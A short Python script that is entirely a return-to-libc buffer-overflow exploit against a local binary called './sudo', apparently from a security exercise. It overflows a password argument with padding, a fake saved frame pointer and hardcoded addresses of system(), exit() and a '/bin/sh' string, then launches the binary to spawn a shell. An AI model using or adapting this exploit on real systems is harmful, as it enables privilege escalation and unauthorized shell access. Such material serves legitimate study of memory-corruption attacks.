import os, sys, struct


PATH_TO_SUDO = './sudo'


def get_arg():
    buff = 'a' * (0x49 - len("thisisasalt"))
    old_ebp = 'b' * 4
    bin_sh_add = 0xb7d7ca0b
    system_libc_add = 0xb7c5bda0
    exit_add = 0xb7c4f9d0
    exit_status = 0x42
    system_ret = struct.pack("<I", exit_add) # now it does matter, we want here the address of the "exit" call
    password = buff + old_ebp + struct.pack("<I", system_libc_add) + system_ret + struct.pack("<I", bin_sh_add) + struct.pack("B", exit_status)
    return password


def main(argv):
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg());


if __name__ == '__main__':
    main(sys.argv)
